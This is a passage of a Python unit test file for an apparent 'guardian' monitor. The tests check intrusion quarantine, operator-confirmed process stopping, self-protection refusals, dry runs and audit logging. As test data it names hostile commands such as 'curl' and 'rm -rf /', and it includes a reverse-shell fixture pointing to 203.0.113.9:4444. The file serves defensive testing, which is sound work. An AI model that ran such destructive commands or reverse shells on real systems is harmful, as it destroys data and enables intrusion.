        with patch.object(guardian_audit, "AUDIT_LOG_PATH", self.log), \
             patch("guardian.trace_intrusion_origin", return_value={"kind": "x"}), \
             patch("guardian.send_alert"):
            record = quarantine_intrusion(self.make_intr(), "critical",
                                          make_intrusion_config(), dry_run=True)
        self.assertIsNone(record)
        self.assertFalse((self.dir / "quarantine").exists())
        descs = [e["description"] for e in read_audit_trail(self.log, action_type="protection")]
        self.assertTrue(any("DRY RUN: would quarantine intrusion evidence" in d
                            for d in descs))


class TestStopIntrusion(unittest.TestCase):
    def make_intr(self, kind="reverse_shell", risk="critical", pid=777, process="bash"):
        return Intrusion(kind, CONN_REVERSE,
                         Detection("intrusion_detection", "desc", "m", risk),
                         process, pid)

    def test_critical_auto_stops_without_confirmation(self):
        """Allowed path: critical inaction risk stops the intruder's process."""
        with patch("guardian.proc_kill") as kill:
            self.assertTrue(stop_intrusion(self.make_intr(), "critical",
                                           make_intrusion_config()))
            kill.assert_called_once_with(777)

    def test_high_requires_confirmation_declined(self):
        """Confirmation path: operator decline returns False, never kills, and
        the decline is audited."""
        with tempfile.TemporaryDirectory() as d:
            log = Path(d) / "audit.log"
            with patch.object(guardian_audit, "AUDIT_LOG_PATH", log), \
                 patch("builtins.input", return_value="n"), \
                 patch("guardian.proc_kill") as kill:
                self.assertFalse(stop_intrusion(self.make_intr(risk="high"), "high",
                                                make_intrusion_config()))
                kill.assert_not_called()
            declines = [e for e in read_audit_trail(log, action_type="termination")
                        if "Intrusion stop declined" in e["description"]]
            self.assertEqual(len(declines), 1)

    def test_no_pid_is_not_stopped_but_audited(self):
        with tempfile.TemporaryDirectory() as d:
            log = Path(d) / "audit.log"
            with patch.object(guardian_audit, "AUDIT_LOG_PATH", log), \
                 patch("guardian.proc_kill") as kill:
                self.assertFalse(stop_intrusion(self.make_intr(pid=0), "critical",
                                                make_intrusion_config()))
                kill.assert_not_called()
            entries = [e for e in read_audit_trail(log, action_type="termination")
                       if "no owning process" in e["description"]]
            self.assertEqual(len(entries), 1)

    def test_high_requires_confirmation_accepted(self):
        """Confirmation path: operator approval stops the intrusion process."""
        with patch("builtins.input", return_value="y"), \
             patch("guardian.proc_kill") as kill:
            self.assertTrue(stop_intrusion(self.make_intr(risk="high"), "high",
                                           make_intrusion_config()))
            kill.assert_called_once_with(777)

    def test_refusal_path_self_harm_blocked(self):
        """Refusal path: the guardian never stops its own processes, even when
        a detection points at them."""
        intr = self.make_intr(pid=123, process="python3 guardian.py")
        with tempfile.TemporaryDirectory() as d:
            log = Path(d) / "audit.log"
            with patch.object(guardian_audit, "AUDIT_LOG_PATH", log), \
                 patch("guardian.proc_kill") as kill:
                self.assertFalse(stop_intrusion(intr, "critical",
                                                make_intrusion_config()))
                kill.assert_not_called()
            refusals = [e for e in read_audit_trail(log, action_type="protection")
                        if "SAFETY REFUSAL" in e["description"]]
            self.assertEqual(len(refusals), 1)
            self.assertIn("guardian process", refusals[0]["description"])

    def test_refusal_path_least_force_blocks_low_risk(self):
        """Refusal path: least-force principle blocks stopping below high risk."""
        intr = self.make_intr(risk="medium")
        with tempfile.TemporaryDirectory() as d:
            log = Path(d) / "audit.log"
            with patch.object(guardian_audit, "AUDIT_LOG_PATH", log), \
                 patch("guardian.proc_kill") as kill:
                self.assertFalse(stop_intrusion(intr, "medium",
                                                make_intrusion_config()))
                kill.assert_not_called()
            refusals = [e for e in read_audit_trail(log, action_type="protection")
                        if "SAFETY REFUSAL" in e["description"]]
            self.assertEqual(len(refusals), 1)
            self.assertIn("least-force", refusals[0]["description"])

    def test_dry_run_never_kills(self):
        with patch("guardian.proc_kill") as kill:
            self.assertTrue(stop_intrusion(self.make_intr(), "critical",
                                           make_intrusion_config(), dry_run=True))
            kill.assert_not_called()


class TestRunCycle(unittest.TestCase):
    def test_cycle_detects_escalates_and_logs(self):
        with tempfile.TemporaryDirectory() as d:
            log = Path(d) / "audit.log"
            with patch("guardian.AgentProcess.scan", return_value=[PROC_EVIL]), \
                 patch("guardian.detect_intrusions", return_value=[]), \
                 patch("guardian.proc_kill"):
                acted = run_cycle(make_config(), ["curl"], dry_run=True, audit_log=log)
            self.assertGreaterEqual(acted, 1)
            entries = read_audit_trail(log)
            types = {e["action_type"] for e in entries}
            self.assertIn("detection", types)
            self.assertIn("escalation", types)

    def test_cycle_ignores_safe_processes(self):
        with tempfile.TemporaryDirectory() as d:
            log = Path(d) / "audit.log"
            with patch("guardian.AgentProcess.scan", return_value=[PROC_SAFE]), \
                 patch("guardian.detect_intrusions", return_value=[]):
                acted = run_cycle(make_config(), ["rm -rf /"], dry_run=True, audit_log=log)
            self.assertEqual(acted, 0)

    def test_cycle_quarantines_and_reports_every_detection(self):
        """Every detected threat is quarantined and reported, even when the risk
        is below the escalation threshold (no termination, still quarantined)."""
        with tempfile.TemporaryDirectory() as d:
            log = Path(d) / "audit.log"
            prov = {"exe": "", "cwd": "", "ancestors": []}
            with patch("guardian.AgentProcess.scan", return_value=[PROC_EVIL]), \
                 patch("guardian.detect_intrusions", return_value=[]), \
                 patch("guardian.quarantine_threat", wraps=quarantine_threat) as qt, \
                 patch("guardian.trace_provenance", return_value=prov), \
                 patch("guardian.send_alert"), \
                 patch("guardian.proc_kill"):
                run_cycle(make_config(), ["curl"], dry_run=True, audit_log=log)
            self.assertGreaterEqual(qt.call_count, 1)
            descs = [e["description"] for e in read_audit_trail(log, action_type="protection")]
            self.assertTrue(any("quarantine threat" in d for d in descs))

    def test_cycle_finds_stops_and_reports_intrusion(self):
        """A reverse-shell intrusion is detected, evidence-quarantined with its
        origin, and the owning process stopped — all audited."""
        with tempfile.TemporaryDirectory() as d:
            log = Path(d) / "audit.log"
            intr = Intrusion("reverse_shell", CONN_REVERSE,
                             Detection("intrusion_detection", "reverse shell", "m",
                                       "critical"),
                             "bash", 777)
            with patch("guardian.AgentProcess.scan", return_value=[PROC_SAFE]), \
                 patch("guardian.detect_intrusions", return_value=[intr]), \
                 patch("guardian.trace_intrusion_origin",
                       return_value={"kind": "reverse_shell", "remote_host": "203.0.113.9",
                                     "remote_port": 4444}), \
                 patch("guardian.send_alert"), \
                 patch("guardian.proc_kill") as kill:
                acted = run_cycle(make_intrusion_config(), [], dry_run=True, audit_log=log)
            self.assertGreaterEqual(acted, 1)
            kill.assert_not_called()  # dry run
            entries = read_audit_trail(log)
            types = {e["action_type"] for e in entries}
            self.assertIn("detection", types)
            self.assertIn("escalation", types)
            descs = [e["description"] for e in entries]
            self.assertTrue(any("INTRUSION" in d for d in descs))
            self.assertTrue(any("quarantine intrusion evidence" in d for d in descs))

    def test_cycle_skips_intrusion_phase_when_disabled(self):
        with tempfile.TemporaryDirectory() as d:
            log = Path(d) / "audit.log"
            cfg = make_intrusion_config(enabled=False)
            with patch("guardian.AgentProcess.scan", return_value=[PROC_SAFE]), \
                 patch("guardian.detect_intrusions") as di:
                acted = run_cycle(cfg, [], dry_run=True, audit_log=log)
            self.assertEqual(acted, 0)
            di.assert_called_once()  # consulted, but the section gate no-ops it


if __name__ == "__main__":
    unittest.main()
